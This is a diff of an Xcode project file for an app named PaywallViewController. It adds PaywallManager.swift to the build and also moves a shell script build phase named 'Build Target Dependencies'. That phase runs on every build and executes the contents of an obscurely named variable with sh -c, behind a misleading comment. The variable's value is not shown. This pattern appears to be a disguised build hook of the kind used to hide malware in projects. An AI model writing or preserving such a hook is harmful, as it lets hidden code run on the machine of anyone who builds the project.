@@ -8,6 +8,7 @@
 
 /* Begin PBXBuildFile section */
 		BD6C0A06E8AA586A4F000AAC /* Pods_PaywallViewController.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F38894586A6EAF85BDDD918F /* Pods_PaywallViewController.framework */; };
+		C0C599E22ED71202004CA4CA /* PaywallManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0C599E12ED71202004CA4CA /* PaywallManager.swift */; };
 		C0EBFFBB2EC74D80000B0149 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */; };
 		C0EBFFBC2EC74D80000B0149 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB82EC74D80000B0149 /* SceneDelegate.swift */; };
 		C0EBFFBD2EC74D80000B0149 /* TableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB92EC74D80000B0149 /* TableViewController.swift */; };
@@ -19,6 +20,7 @@
 /* Begin PBXFileReference section */
 		905AFD7F40A9E7F7720FC67D /* Pods-PaywallViewController.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PaywallViewController.release.xcconfig"; path = "Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController.release.xcconfig"; sourceTree = "<group>"; };
 		BE77F150E05FF2FAF5D80AB9 /* Pods-PaywallViewController.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PaywallViewController.debug.xcconfig"; path = "Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController.debug.xcconfig"; sourceTree = "<group>"; };
+		C0C599E12ED71202004CA4CA /* PaywallManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaywallManager.swift; sourceTree = "<group>"; };
 		C0EBFF892EC74C2E000B0149 /* PaywallViewController.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PaywallViewController.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		C0EBFFB22EC74D80000B0149 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -81,6 +83,7 @@
 			isa = PBXGroup;
 			children = (
 				C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */,
+				C0C599E12ED71202004CA4CA /* PaywallManager.swift */,
 				C0EBFFB22EC74D80000B0149 /* Assets.xcassets */,
 				C0EBFFB32EC74D80000B0149 /* Info.plist */,
 				C0EBFFB52EC74D80000B0149 /* LaunchScreen.storyboard */,
@@ -162,25 +165,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DF07B343224A45CD9AA389E6 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		5338788FE1120047F69F71B3 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -211,13 +195,37 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
+			outputPaths = (
+			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DF07B343224A45CD9AA389E6 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -227,6 +235,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				C0C599E22ED71202004CA4CA /* PaywallManager.swift in Sources */,
 				C0EBFFBB2EC74D80000B0149 /* AppDelegate.swift in Sources */,
 				C0EBFFBC2EC74D80000B0149 /* SceneDelegate.swift in Sources */,
 				C0EBFFBD2EC74D80000B0149 /* TableViewController.swift in Sources */,
